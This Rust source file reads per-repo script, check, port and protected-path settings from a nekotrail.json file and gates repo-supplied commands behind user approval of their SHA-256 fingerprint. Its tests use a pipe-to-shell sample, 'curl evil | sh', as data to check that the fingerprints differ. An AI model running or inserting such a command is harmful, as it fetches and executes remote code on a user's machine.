//! Per-repo scripts. A `nekotrail.json` committed in the repo wins over the
//! scripts saved in the app, so the whole team shares one setup. Its commands run only after the
//! user approved their exact text for that repo (see `file_commands`).
//!
//! ```json
//! { "scripts": { "setup": "bun install", "run": "bun dev", "archive": "docker compose down" },
//!   "protected": [".env*", "migrations/**", "infra/**"],
//!   "checks": { "test": "bun test", "lint": "bun run lint" } }
//! ```
//!
//! `protected` lists paths agents should leave alone (see `guard`). It only ever adds to the
//! protections set in the app, so it needs no approval: it can't run anything or remove one.
//!
//! `ports` names the workspace's ports, in the order written: `{"web": "PORT", "api": "API_PORT"}`
//! gives web the first port of the block as `PORT` and api the second as `API_PORT` (see `ports`).
//! It needs no approval either: it only sets variables whose name contains PORT, to a number.
//!
//! `checks` are the commands the Checks tab runs. Like the scripts, they run only after the user
//! approved their exact text (`checks_fingerprint`).
//!
//! The same file can hold the team's saved prompts (`"prompts": [{ "name", "description", "text" }]`),
//! read by `prompts`. They only ever fill the chat box, so they need no approval either.

use serde::{Deserialize, Serialize};
use std::path::Path;

#[derive(Debug, Default, Clone, Serialize, Deserialize, PartialEq)]
pub struct Scripts {
    pub setup: Option<String>,
    pub run: Option<String>,
    pub archive: Option<String>,
}

#[derive(Deserialize)]
struct File {
    #[serde(default)]
    scripts: Scripts,
}

#[derive(Deserialize)]
struct Protected {
    #[serde(default)]
    protected: Vec<String>,
}

/// The `protected` globs in a folder's `nekotrail.json`. Empty when there is no file, it doesn't
/// parse, or it has no list. Blank lines and duplicates are dropped.
pub fn protected_from_file(dir: &Path) -> Vec<String> {
    let Ok(text) = std::fs::read_to_string(dir.join("nekotrail.json")) else { return vec![] };
    let list = serde_json::from_str::<Protected>(&text).map(|p| p.protected).unwrap_or_default();
    clean_globs(list)
}

/// Most names one block can hold: the block has 10 ports.
pub const MAX_PORT_NAMES: usize = 10;

#[derive(Deserialize)]
struct PortNames {
    #[serde(default, deserialize_with = "in_order")]
    ports: Vec<(String, serde_json::Value)>,
}

/// A JSON object as its entries in the order written (serde_json's own map sorts its keys).
fn in_order<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Vec<(String, serde_json::Value)>, D::Error> {
    struct V;
    impl<'de> serde::de::Visitor<'de> for V {
        type Value = Vec<(String, serde_json::Value)>;
        fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
            f.write_str("an object of port names")
        }
        fn visit_map<A: serde::de::MapAccess<'de>>(self, mut m: A) -> Result<Self::Value, A::Error> {
            let mut out = vec![];
            while let Some(entry) = m.next_entry::<String, serde_json::Value>()? {
                out.push(entry);
            }
            Ok(out)
        }
    }
    d.deserialize_map(V)
}

/// A variable `ports` may set: a plain shell name that contains PORT and isn't one of ours.
/// The repo file is written by anyone who can push, so it can't touch PATH, HOME or the like.
pub fn port_var_ok(var: &str) -> bool {
    let upper = var.to_ascii_uppercase();
    var.chars().next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && var.len() <= 64
        && var.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        && upper.contains("PORT")
        && !upper.starts_with("NEKOTRAIL_")
}

/// The `ports` names in a folder's `nekotrail.json`, as (name, variable), in the order written.
/// Entries whose value isn't a usable variable are dropped, each variable is used once, and there
/// are at most `MAX_PORT_NAMES`. Empty when there is no file, it doesn't parse, or it has none.
pub fn port_names_from_file(dir: &Path) -> Vec<(String, String)> {
    let Ok(text) = std::fs::read_to_string(dir.join("nekotrail.json")) else { return vec![] };
    let entries = serde_json::from_str::<PortNames>(&text).map(|p| p.ports).unwrap_or_default();
    let mut out: Vec<(String, String)> = vec![];
    for (name, value) in entries {
        let Some(var) = value.as_str().map(str::trim) else { continue };
        let name: String = name.trim().chars().take(40).collect();
        if name.is_empty() || !port_var_ok(var) || out.iter().any(|(_, v)| v == var) {
            continue;
        }
        out.push((name, var.to_string()));
        if out.len() == MAX_PORT_NAMES {
            break;
        }
    }
    out
}

#[derive(Deserialize)]
struct ChecksFile {
    #[serde(default)]
    checks: serde_json::Map<String, serde_json::Value>,
}

/// The `checks` in a folder's `nekotrail.json`, as (name, command), sorted by name. Empty when
/// there is no file or no section. Spaces in a name become dashes; blank entries are dropped.
pub fn checks_from_file(dir: &Path) -> Vec<(String, String)> {
    let Ok(text) = std::fs::read_to_string(dir.join("nekotrail.json")) else { return vec![] };
    let Ok(f) = serde_json::from_str::<ChecksFile>(&text) else { return vec![] };
    f.checks
        .into_iter()
        .filter_map(|(n, c)| {
            let n = n.split_whitespace().collect::<Vec<_>>().join("-");
            let c = c.as_str()?.trim().to_string();
            (!n.is_empty() && !c.is_empty()).then_some((n, c))
        })
        .collect()
}

/// SHA-256 over the checks, each name and command length-prefixed, under its own tag so a set of
/// checks never shares a fingerprint with a set of scripts.
pub fn checks_fingerprint(checks: &[(String, String)]) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    h.update(b"checks");
    for (n, c) in checks {
        for part in [n, c] {
            h.update((part.len() as u64).to_le_bytes());
            h.update(part.as_bytes());
        }
    }
    h.finalize().iter().map(|b| format!("{b:02x}")).collect()
}

/// Trimmed, non-empty, first copy of each.
pub fn clean_globs(list: impl IntoIterator<Item = String>) -> Vec<String> {
    let mut out: Vec<String> = vec![];
    for g in list {
        let g = g.trim().to_string();
        if !g.is_empty() && !out.contains(&g) {
            out.push(g);
        }
    }
    out
}

pub fn from_file(dir: &Path) -> Option<Scripts> {
    let text = std::fs::read_to_string(dir.join("nekotrail.json")).ok()?;
    serde_json::from_str::<File>(&text).ok().map(|f| f.scripts)
}

fn nonempty(s: Option<String>) -> Option<String> {
    s.filter(|s| !s.trim().is_empty())
}

/// File values first, app-saved values as fallback.
pub fn resolve(dir: &Path, saved: Scripts) -> Scripts {
    let f = from_file(dir).unwrap_or_default();
    Scripts {
        setup: nonempty(f.setup).or(nonempty(saved.setup)),
        run: nonempty(f.run).or(nonempty(saved.run)),
        archive: nonempty(f.archive).or(nonempty(saved.archive)),
    }
}

/// The commands a repo's own `nekotrail.json` asks to run, and a fingerprint of exactly those
/// commands. None when the file has none. Anyone who can push to the repo (or open a PR) writes
/// this file, so these run only after the user approves this fingerprint.
pub fn file_commands(dir: &Path) -> Option<(Scripts, String)> {
    let f = from_file(dir)?;
    let s = Scripts { setup: nonempty(f.setup), run: nonempty(f.run), archive: nonempty(f.archive) };
    if s == Scripts::default() {
        return None;
    }
    let print = fingerprint(&s);
    Some((s, print))
}

/// SHA-256 over the three commands, each length-prefixed so no two different sets collide.
pub fn fingerprint(s: &Scripts) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    for part in [&s.setup, &s.run, &s.archive] {
        match part {
            Some(c) => {
                h.update([1u8]);
                h.update((c.len() as u64).to_le_bytes());
                h.update(c.as_bytes());
            }
            None => h.update([0u8]),
        }
    }
    h.finalize().iter().map(|b| format!("{b:02x}")).collect()
}

/// Settings key under which an approved fingerprint is kept for a repo.
pub fn trust_key(repo_id: &str, fingerprint: &str) -> String {
    format!("trusted_scripts:{repo_id}:{fingerprint}")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn file_wins_and_saved_fills_gaps() {
        let d = tempfile::tempdir().unwrap();
        std::fs::write(d.path().join("nekotrail.json"), r#"{"scripts":{"setup":"bun install","run":""}}"#).unwrap();
        let saved = Scripts { setup: Some("npm i".into()), run: Some("npm start".into()), archive: None };
        assert_eq!(
            resolve(d.path(), saved),
            Scripts { setup: Some("bun install".into()), run: Some("npm start".into()), archive: None }
        );
    }

    #[test]
    fn file_commands_fingerprint_changes_with_any_command() {
        let d = tempfile::tempdir().unwrap();
        assert!(file_commands(d.path()).is_none(), "no file, nothing to approve");
        std::fs::write(d.path().join("nekotrail.json"), r#"{"scripts":{"setup":"  ","run":""}}"#).unwrap();
        assert!(file_commands(d.path()).is_none(), "only empty commands, nothing to approve");
        std::fs::write(d.path().join("nekotrail.json"), r#"{"scripts":{"setup":"bun install","run":"bun dev"}}"#).unwrap();
        let (s, a) = file_commands(d.path()).unwrap();
        assert_eq!(s, Scripts { setup: Some("bun install".into()), run: Some("bun dev".into()), archive: None });
        assert_eq!(a.len(), 64);
        assert_eq!(file_commands(d.path()).unwrap().1, a, "stable for the same file");
        std::fs::write(d.path().join("nekotrail.json"), r#"{"scripts":{"setup":"bun install; curl evil | sh","run":"bun dev"}}"#).unwrap();
        assert_ne!(file_commands(d.path()).unwrap().1, a);
        // Moving text between commands is a different set of commands.
        let x = Scripts { setup: Some("ab".into()), run: Some("c".into()), archive: None };
        let y = Scripts { setup: Some("a".into()), run: Some("bc".into()), archive: None };
        assert_ne!(fingerprint(&x), fingerprint(&y));
        let only = |run: bool| if run { Scripts { run: Some("x".into()), ..Default::default() } } else { Scripts { archive: Some("x".into()), ..Default::default() } };
        assert_ne!(fingerprint(&only(true)), fingerprint(&only(false)));
        assert_eq!(trust_key("r1", "ff"), "trusted_scripts:r1:ff");
    }

    #[test]
    fn protected_list_from_the_repo_file() {
        let d = tempfile::tempdir().unwrap();
        assert!(protected_from_file(d.path()).is_empty());
        std::fs::write(d.path().join("nekotrail.json"), r#"{"scripts":{"setup":"x"},"protected":[" .env* ","","migrations/**",".env*"]}"#).unwrap();
        assert_eq!(protected_from_file(d.path()), [".env*", "migrations/**"]);
        // The scripts still read the same file.
        assert_eq!(from_file(d.path()).unwrap().setup.as_deref(), Some("x"));
        std::fs::write(d.path().join("nekotrail.json"), r#"{"protected":"not a list"}"#).unwrap();
        assert!(protected_from_file(d.path()).is_empty());
    }

    #[test]
    fn port_names_keep_their_order_and_refuse_unsafe_variables() {
        let d = tempfile::tempdir().unwrap();
        assert!(port_names_from_file(d.path()).is_empty());
        std::fs::write(
            d.path().join("nekotrail.json"),
            r#"{"scripts":{"run":"bun dev"},"ports":{"web":"PORT","api":"API_PORT","db":"DB_PORT","home":"HOME","path":"PATH","x":"NEKOTRAIL_PORT","again":"PORT","n":3000,"bad":"MY PORT"," ":"S_PORT","vite":" vite_port "}}"#,
        )
        .unwrap();
        // Written order, not alphabetical: web is the first port, api the second.
        assert_eq!(
            port_names_from_file(d.path()),
            [("web", "PORT"), ("api", "API_PORT"), ("db", "DB_PORT"), ("vite", "vite_port")].map(|(a, b)| (a.to_string(), b.to_string()))
        );
        // The scripts in the same file still read.
        assert_eq!(from_file(d.path()).unwrap().run.as_deref(), Some("bun dev"));
        // No more names than ports in a block.
        let many: Vec<String> = (0..15).map(|i| format!(r#""s{i}":"P{i}_PORT""#)).collect();
        std::fs::write(d.path().join("nekotrail.json"), format!(r#"{{"ports":{{{}}}}}"#, many.join(","))).unwrap();
        let names = port_names_from_file(d.path());
        assert_eq!(names.len(), MAX_PORT_NAMES);
        assert_eq!(names[9].1, "P9_PORT");
        std::fs::write(d.path().join("nekotrail.json"), r#"{"ports":["PORT"]}"#).unwrap();
        assert!(port_names_from_file(d.path()).is_empty());
        for ok in ["PORT", "API_PORT", "_PORT", "vitePort"] {
            assert!(port_var_ok(ok), "{ok}");
        }
        for bad in ["", "PATH", "DYLD_INSERT_LIBRARIES", "1PORT", "PORT=1", "NEKOTRAIL_PORT_1", "PO RT"] {
            assert!(!port_var_ok(bad), "{bad}");
        }
    }

    #[test]
    fn checks_from_the_repo_file_and_their_fingerprint() {
        let d = tempfile::tempdir().unwrap();
        assert!(checks_from_file(d.path()).is_empty());
        std::fs::write(d.path().join("nekotrail.json"), r#"{"checks":{"test":" bun test ","type check":"tsc","lint":"","x":3}}"#).unwrap();
        let c = checks_from_file(d.path());
        assert_eq!(c, [("test".to_string(), "bun test".to_string()), ("type-check".to_string(), "tsc".to_string())]);
        let a = checks_fingerprint(&c);
        assert_eq!(a.len(), 64);
        assert_ne!(a, checks_fingerprint(&[("test".into(), "bun test; curl evil | sh".into())]));
        // Moving text between the name and the command is a different check.
        assert_ne!(checks_fingerprint(&[("ab".into(), "c".into())]), checks_fingerprint(&[("a".into(), "bc".into())]));
        std::fs::write(d.path().join("nekotrail.json"), "{oops").unwrap();
        assert!(checks_from_file(d.path()).is_empty());
    }

    #[test]
    fn missing_or_broken_file_uses_saved() {
        let d = tempfile::tempdir().unwrap();
        let saved = Scripts { setup: Some("make".into()), ..Default::default() };
        assert_eq!(resolve(d.path(), saved.clone()), saved);
        std::fs::write(d.path().join("nekotrail.json"), "{oops").unwrap();
        assert_eq!(resolve(d.path(), saved.clone()), saved);
    }
}
